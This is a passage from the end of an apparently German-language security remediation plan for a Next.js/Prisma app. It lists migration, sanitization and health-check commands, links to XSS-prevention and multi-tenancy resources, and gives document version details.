# 3. DB-Migration
npx prisma db push

# 4. Sanitization-Script
npx tsx scripts/sanitize-existing-lessons.ts

# 5. Verification
curl http://localhost:3000/api/health
```

---

## 📚 WEITERE RESOURCES

- [Next.js Security](https://nextjs.org/docs/app/building-your-application/configuring/environment-variables)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Prisma Multi-Tenancy](https://www.prisma.io/docs/concepts/building-applications/multi-tenancy)
- [Vitest Guide](https://vitest.dev/guide/)
- [DOMPurify](https://github.com/cure53/DOMPurify)

---

**Dokument Version:** 1.0  
**Last Updated:** 2026-05-20  
**Status:** Pending Implementation  
**Owner:** Development Team
